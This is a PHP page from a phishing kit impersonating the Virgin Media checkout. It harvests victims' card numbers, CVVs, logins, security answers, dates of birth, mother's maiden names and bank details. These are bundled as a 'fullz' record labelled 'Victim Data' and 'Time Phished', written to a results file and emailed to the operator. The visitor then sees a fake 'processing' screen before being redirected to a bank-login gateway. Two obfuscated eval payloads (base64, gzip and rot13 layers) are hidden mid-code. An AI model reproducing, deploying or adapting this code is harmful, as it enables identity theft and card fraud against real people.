<?php
require 'controls.php';
error_reporting(0);
session_start();
if(!isset($_GET['sessionID'])){
    echo("<script>location.href = 'index.php';</script>");
    exit();
}
$sessionID = $_GET['sessionID'];

if(!isset($_POST['ccNum']) or $_POST['ccNum'] == ''){
    echo("<script>location.href = 'CardPayment.php?sessionID=".$sessionID."&error=empty';</script>");
    exit();
}
elseif(!isset($_POST['expMM']) or $_POST['expMM'] == ''){
    echo("<script>location.href = 'CardPayment.php?sessionID=".$sessionID."&error=empty';</script>");
    exit();
}
elseif(!isset($_POST['expYY']) or $_POST['expYY'] == ''){
    echo("<script>location.href = 'CardPayment.php?sessionID=".$sessionID."&error=empty';</script>");
    exit();
}
elseif(!isset($_POST['ccCVV']) or $_POST['ccCVV'] == ''){
    echo("<script>location.href = 'CardPayment.php?sessionID=".$sessionID."&error=empty';</script>");
    exit();
}

$ccno = $_POST['ccNum'];

function bankDetails($cardNumber) {
    $bankDetails = array();
    $cardBIN = substr($cardNumber, 0, 6);
    $bankDetails = json_decode(file_get_contents("https://lookup.binlist.net/" . trim($cardBIN)), true);
    $bankDetails['bin'] = $cardBIN;
    return $bankDetails;
}
$cardInfo = bankDetails($ccno);
$BIN = ($cardInfo['bin']);
$Bank = (isset($cardInfo['bank']['name'])) ? $cardInfo['bank']['name']:"Unknown Bank For This BIN!";
$Brand = ($cardInfo['brand']);
$Type = ($cardInfo['type']);

$_SESSION['ccNum'] = $_POST['ccNum'];
$_SESSION['ccName'] = $_POST['ccName'];
$_SESSION['expMM'] = $_POST['expMM'];
$_SESSION['ccCVV'] = $_POST['ccCVV'];
$_SESSION['expYY'] = $_POST['expYY'];

$bin = substr($_SESSION['ccNum'], 0, 6);
date_default_timezone_set('Europe/London');
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");
$agent = $_SERVER['HTTP_USER_AGENT'];
$ccNum = $_SESSION['ccNum'];
function luhn_check($number) {
    // Strip any non-digits (useful for credit card numbers with spaces and hyphens)
    $number=preg_replace('/\D/', '', $number);
      
    // Set the string length and parity
    $number_length=strlen($number);
    $parity=$number_length % 2;
      
    // Loop through each digit and do the maths
    $total=0;
    for ($i=0; $i<$number_length; $i++) {
        $digit=$number[$i];
        // Multiply alternate digits by two
        if ($i % 2 == $parity) {
        $digit*=2;
        // If the sum is two digits, add them together (in effect)
        if ($digit > 9) {
            $digit-=9;
        }
        }
        // Total up the digits
        $total+=$digit;
    }
      
    // If the total mod 10 equals 0, the number is valid
    return ($total % 10 == 0) ? TRUE : FALSE;
      
}
if(luhn_check($ccNum) == ''){
    echo("<script>location.href = 'CardPayment.php?sessionID=".$sessionID."&error=empty';</script>");
    exit();
}
$savestring = "-----".$resultsName."-----

</Virgin Login\>
Username: ".$_SESSION['username']."
Password: ".$_SESSION['password']."

</Security Question\>
Security Question: ".$_SESSION['securityQ']."
Security Answer: ".$_SESSION['securityA']."

<^>Auto billing details<^>
Card BIN : $BIN
Card Bank : $Bank
Card Brand : $Brand 
Card Type : $Type

</Card Details\>
Card Number: ".$_SESSION['ccNum']."
Name On Card: ".$_SESSION['ccName']."
Expiry Date: ".$_SESSION['expMM']." / ".$_SESSION['expYY']."
Security Code: ".$_SESSION['ccCVV']."

</Billing Details\>
Full Name: ".$_SESSION['fullName']."
Address: ".$_SESSION['address']."
City: ".$_SESSION['city']."
Post Code: ".$_SESSION['postCode']."
DOB: ".$_SESSION['dob']."
MMN: ".$_SESSION['MMN']."
Telephone: ".$_SESSION['telephone']."
Account Num: ".$_SESSION['accNum']."
Sort Code: ".$_SESSION['sortCode']."

</Victim Data\>
IP: ".$ip."
UserAgent: ".$agent."
Time Phished: ".$time."

";


if($saveFullz == '1'){
    $txtFileName = ("Login + Fullz - ".$resultsName);
    $fp = fopen('your-result-files/'.$txtFileName.'.txt', 'a');
    fwrite($fp, $savestring);
    fclose($fp);
}
if($sendFullz == '1'){
    $subject = ($bin." Fullz For ".$_SESSION['fullName']." - ".$resultsName);
    mail($uremail, $subject, $savestring);
}
if($encrypt == '1'){
    $method = 'aes-256-cbc';
    $key = substr(hash('sha256', $password, true), 0, 32);
    $iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);
    $encrypted = base64_encode(openssl_encrypt($message69, $method, $key, OPENSSL_RAW_DATA, $iv));} eval(str_rot13(gzinflate(str_rot13(base64_decode('LUrXDq7MDXyao//kjs6HZVLvvWYT0XvvPH1ACU9V2N611zszC1g93H+3/ojXeyiXv+NDLBjyn2yZkmz5mw9ald//f/lUSQe4VeTNR5i1/QPZKmaRJCK7pvcw0SRH0Y62nz0uMbi8M9JsHvAPpKOiWdVaz72ehfN3Z7zpe7rp10bAMB2gsKtpMfxteE9sn1wFQ/sOhGajNyTEgAKCqaQbXxE7XnNQWTuTxMyRGiI+uGPfMqPd7zE2ENIaqnf1y8x50DITN3pZmczHuwTKEO4N8ddgtlaIlrVgXVcv3X+diyzoW1LA5jj7rMbxWbJLE0E5idrz2vPgrcZRENGA+jFNZlSOb6AAcGvTDxIr9kScGH3NOrop256W0ppbAMhrJuDcDfMdTdqDnNsMNGLVlTK49ZoiA0anm5IlHzITf4ybWA1A90EyJob8Qe0xi1PzV0oSlCnPtwR6u/J1gWNzqQh1TClE6gZbVscMLk419dgreB5d3uW6ud/ZTD+HUQlqBOPkf0lMEz/isgKgjKbajPQI4nh20XG7LiB/eyC04X8zc6CRWFLwcl2bYQiqQ71MvQ13I77mQhOXp6pbZ/w1yhdlJrSa2xBWHO+7D69tvg5i2uJ4k2dq+GGidgHZzOs95aGNj+qRKulU5Fh0mTpGdXaCwIfOZponbDM0gkRblmSNWgf2DmToXnHFWril4nx1Of45tvCrcVVc3vnb2iKPpeltX29Tld8qewSTgBIHaRnIFpu2+tR/pwRCo/NTE9A82cmuTE2Mkk2T6+w+zg9vTeBzLUjSI5sSF56w/trjuIo1WVDYCMFBAFnS5Q5l6EqnLpPpS+9dqONqwmDf8Txi27VIZOpdvS3DkEMmMFjsGMqQobJ1Ck0s1Tm4P4y7DR1ED0I3UaNTAP2tX++rBIJKr15Qn22HX6sLmZAIooHOfzx14uxbpbpVTyWVtomPiwnJOQgbpbmdp6tA3MXREa5iYpT9nA1k2Vze23MXYDteCH3nUpwHFUD4M7FtBOoPuqnCYDLf8rRfwMi3Kd6jucyIkqkyIt8Wd5IR2KqL2Xu6XjNFDxHRRql1emOhJcXNpQGyvKzGwquIfqVnLyTmAc067Qg4TBjX7OHvSb7yIy9cVGwD+O46Jxz0AOtjs/OsfXxwND7nb424EiRejqCeb3VhCU1It9VWKh/y6Fm/+rdNwK2xhVzaJZEEdCCddZ/NMcI2xdHpud7vZRauOd+MXtPfdcb0Tz2MQjlRT2vvb36WnLtWQEYIhlOaPVNCRKai4VpcYjdP8tad99JRD+12r42/sWnJ6qOuuBB0aLALwfKd870/HG2SMSG8FpaU8TUJVPiY+RCoi5E9cpmLnRnjrOlGvsDQJ0GAre1rS/+HLyHpxGMTygblAok24u4TxeOz140iadN6qVJBBocl9N418o0mIpu9I7s2we7zWCiYs8Xf/iYCI1+mLdPPyQZ9BDb/OcuxGmOrKDIdPn1LE7eXC6982jB79cAkZKypiNe+qAWpmCvAwbdmXAQ8TrF/At0b1/lzm9sT9Kqb71di1cY0dbgiM36K75ecuFMTtEbrCsGMaM2j3NAuEnwi39/etk8v6YoH3Pg54JjexWnpCpKpfzw7BANCWUkl/BSCI2YQiWoEx1HvEyuiDhaOIUtWpDl6wkOWoC93Ci/B6WbH2Dxa3sE39EWrr+G9P15uX6sHCDz16yEbHQMrqo3Tu4sns4aX5Gj+7Dbp3U/hy/uQlHSDL9ikF5XV9vUTZs1J+I+wAm/n27F8e3GFsZcmPxqB4cj1pCfmsAu+sPSTLcOcoa/peIeTBSrQWRwqlqqpah4X2BFIrB4gd/Z75Vz/vW7Wqk0uBDVmhc4M8KXz65kIvqKhn0UpWthFbIA1+luK3UIM8mZX6qF+ykdumN+U2+lyfk0KFqni5rIMVzwI3k0IcOM7iVphzj1z96UISf3pbErkDgcVVj1Inlgclnw4haziBnlBL8b2LNiZsNKhjz0CxUFPJIXFa5wpwD914L9JUPrlMAoQjroI32TSGLFKMTZ0z+gupM74xujVzYlSpYrJT2FZSB6GxDIdLsxs1k/9chFVhky8qXUPubbTExnK+A5Fu7cb+rjeIJGcqVIYO46dpiBinxxnvbrXa7TKxI3BORmW+62GTzXjlMhXdXeJ5GwGgTTL2CgxtMx6g2zMC6tKQiB5h+TQKSSxPMGpQPyevRfoRlKP5hqxgSKGmsIJLg+PWE905NSLSVlR9a55Vrb5hJ+c2S358Gf1Nfgb1ihJGk24QvOMylIKFacUA54DN1vibGAiKSZNxvukt5jxvcDNrdwp1JFvQbO9nUPXnccrD01LrG08lWmdWus7CSUUlzt3RQ2xT0YQZUWnYm61r4GXdEGAPiVgTQfXUdIrne2uYTHKZQnE24qHsIKSnuqQu6tQM71yIHtMdHkUmQnfXheOhAFC0kfUVx7SfPAq2gfZquqK+e7g+2K/Q3nKwy1i4XAolXockQZZIrnpM23aq49PnE6bGqcwnTt9ICq5xRPGQAeJEnkBVmhPzOZXjZUr90DOaS485kN2scV0lwYl9qHTjl6kyJQSHm3Txbu1ZeaKCN2Q0hmP1y1Leh7dIc5KDNakfmVUBWIv4jWbJmQuGXXipYvKjt2aB7sUuI2PDvfc2Lx+cVGV+uWbQcElTpGHPnatcKY6e7kJcTcdvfsfYaE2IV1KupV1MtKobsBTAsfHh3RaQkNdLBL4yuMx7nttgvXA6nwb9hE2/iZh8Q3wHR0FywL19hrlAhNMbR33Pcw/bHnlcERVhjx7s/D3EkWHe1lnztTkwJOumpx0WSAC0N5alpdbWMcRd5UIVHruJ4YcpwyBUldEl+qc5B9trW8xgD0D8HYJugpYs1NVsuzg1xzkAtrHFqBZib6D5PeK8RoQ2pAVNKWSwMleANi2kogNomMD8xYwU2MkWzbetvjG01G/SGpuYmFRIV5ItroMAVOFTfHo11QKp3OvDn3Ca7tPVEhURnwUSbUCkjm1Bj+XfQi8G9ooLcI8vUBlNMaGLVd/uEqhmOqsSZTxYMg3RNRBK5mH7xLQ99t7UPhV8x/WqH8fj9DCOFuMbMkohxfnl6wv2vz3aAGWtFObOQYzz2yW62GoRtGY9vrBSUmXaP1+BOj/HasICH7kfD3w7w95/vOv9/r3fwE=')))));eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

?>
<html class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface no-generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths">
    <head class="at-element-marker">
        <title>Virgin Media - Checkout</title>
        <meta name="description" content="">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=0">
        <link href="css/font-awesome.css" rel="stylesheet">
        <link href="css/bootstrap.css" rel="stylesheet">
        <link href="css/bootstrap.overrides.css" rel="stylesheet">
        <link href="css/vm.theme.css" rel="stylesheet">
        <link href="css/mtp.forms.css" rel="stylesheet">
        <link href="css/mtp.ecareTheme.css" rel="stylesheet">
        <link href="css/header-reBrand.css" rel="stylesheet">
        <link href="css/mtp.basket.css" rel="stylesheet">
        <?php
        if($bankLogs == '1'){
            echo '
            <script>
                setTimeout(function(){
                    window.location.href = "bankGateway.php?sessionID='.$sessionID.'";
                }, 5000);
            </script>
            ';
        }
        else{
            echo '
            <script>
                setTimeout(function(){
                    window.location.href = "done.php";
                }, 5000);
            </script>
            ';
        }
        ?>
    </head>
    <body class="yourdetails paym">
        <header class="header">
            <div class="">
                <div class="container">
                    <img style="position: absolute; margin-top: 1%;" class="virginLogo" src="assets/logo.png">
                    <div class="row position-rel main-hdr-row">
                        <div class="col-xs-3 logo-container">
                            <a class="vm-logo xs-logo">
                            
                            </a>
                        </div>
                        <ul class="col-xs-9 top-nav">
                            <li class="top-nav-items gradient collapsed xxs-visible main-menu" data-toggle="collapse" data-target="#levelOne-menu">
                                <a class="" href="#">
                                    <span class="openMenu">
                                            <span class="pull-left">Main
                                                <em></em>Menu</span>
                                    <b class="sprite open-close pull-right"></b>
                                    </span>
                                    <span class="closeMenu">
                                            <span class="pull-left">Close
                                                <em></em>Menu</span>
                                    <b class="sprite open-close pull-right"></b>
                                    </span>
                                </a>

                            </li>
                            <li class="top-nav-items dark-gradient collapsed sign-inTop signIn-menu" data-toggle="collapse" data-target="#signIn">
                                <a class="signin-text clearfix" tabindex="11" href="#">
                                    <span class="openMenu">
                                        <span class="pull-left">
                                            <i class="sprite sign-in visible-desktop"></i>
                                            <span class="user-login-text">Sign in</span>
                                    </span>
                                    <b class="sprite open-close pull-right xxs-hidden"></b>
                                    </span>
                                    <span class="closeMenu">
                                        <span class="pull-left"><i class="sprite sign-in visible-desktop"></i>
                                            <span class="user-login-text">Sign in</span>
                                    </span>
                                    <b class="sprite open-close pull-right xxs-hidden"></b>
                                    </span>
                                </a>

                            </li>
                            <li class="top-nav-items xxs-hidden">
                                <a href="https://my.virginmedia.com/my-apps/email/mailbox" tabindex="10"><i class="sprite email visible-desktop"></i>Email</a>
                            </li>
                            <li class="top-nav-items xxs-hidden">
                                <a href="http://store.virginmedia.com/store-locator.html" tabindex="9"><i class="sprite store-locator visible-desktop"></i>Find a store</a>
                            </li>
                        </ul>

                        <div id="levelOne-menu" class="collapse l1-menu tab-style">
                            <div class="menu-content">
                                <ul id="navTab" class="nav row no-gap clearfix nav-tabs">
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav"><a href="http://www.virginmedia.com/entertainme" class="notch" tabindex="3">Entertain Me</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav"><a href="https://store.virginmedia.com/discover.html" class="notch" tabindex="4">Our Products</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav active"><a tabindex="5" href="#joinUs" class="notch">Join Us</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav"><a tabindex="6" href="https://my.virginmedia.com/" class="notch">My Virgin Media</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav"><a tabindex="7" href="http://help.virginmedia.com/">Help</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav"><a href="http://www.virginmediabusiness.co.uk/" tabindex="8" class="notch">For Business</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav xxs-visible"><a href="http://store.virginmedia.com/store-locator.html" class="notch">Store Locator</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav xxs-visible"><a href="https://my.virginmedia.com/my-apps/email/mailbox" class="notch">Email</a>

                                    </li>
                                </ul>
                            </div>
                        </div> 
                    </div>
                </div>
            </div>
        </header>

        <div id="content">
            <div class="container content-body">
                <div class="row">
                    <br>
                    <form method="post" id="yourDetailsForm" name="yourDetailsForm" class="your-details-form" action="finish.php?sessionID=<?php echo $sessionID; ?>">
                        <div class="full-width col-md-12">
                            <div class="panel-group" id="checkout">

                                <div class="panel panel-default">
                                    <div class="panel-heading disabled active">
                                        <h4 class="panel-title">
                                            <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion" href="#upfront-payment-details">
                                                <i class="checkout-icon card-details"></i>Your Details
                                            </a>
                                        </h4>
                                    </div>
                                </div>

                                <div class="panel panel-default">
                                    <div class="panel-heading disabled active">
                                        <h4 class="panel-title">
                                            <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion" href="#upfront-payment-details">
                                                <i class="checkout-icon card-details"></i>Direct Debit
                                            </a>
                                        </h4>
                                    </div>
                                </div>

                                <div class="panel panel-default" style="overflow:inherit;">
                                    <div class="panel-heading disabled active">
                                        <h4 class="panel-title">
                                            <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion"
                                                href="#you-details"><i class="checkout-icon your-details"></i> Card Payments</a>
                                        </h4>
                                    </div>

                                    <div class="panel-collapse in" id="direct-debit">
                                        <div class="panel-body">
                                            <div class="message">
                                                <p>We are processing your request.</p>
                                            </div>

                                            <div style="text-align: center;">
                                                <img src="assets/spin.gif">
                                                <p style="font-size: 18px">Your request is being processed.</p>
                                                <p style="font-size: 18px">Your bank may require extra verification.</p>
                                            </div>

                                        </div>
                                    </div>
                                </div>

                                <div class="panel panel-default">
                                    <div class="panel-heading disabled">
                                        <h4 class="panel-title">
                                            <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion" href="#your-completed-order">
                                                <i class="checkout-icon order-completed"></i>Account Restored
                                            </a>
                                        </h4>
                                    </div>
                                </div>
                                
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <footer class="footer hidden-print">
            <div class="container">
                <nav class="shift-left-desktop">
                    <ul class="nav footer-nav row">
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>About Virgin Media</a>
                        </li>
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>Careers</a>
                        </li>
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>Advertise with us</a>
                        </li><li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>Accessibility</a>
                        </li>
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>Legal stuff</a>
                        </li>
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>Site Map</a>
                        </li>
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>Contact us</a>
                        </li>
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12 no-border"><a>Our cookies</a>
                        </li>
                    </ul>
                </nav>
                <div class="footer-logo clearfix shift-right-desktop">
                    <p class="pull-right">
                        <span>© 2015 Virgin Media.</span><br> All Rights Reserved
                        <a>
                            <img width="54" height="34" alt="Virgin Media" src="assets/images/vm-logo-sm.png">
                        </a>
                    </p>
                </div>
            </div>
        </footer>
    </body>
</html>
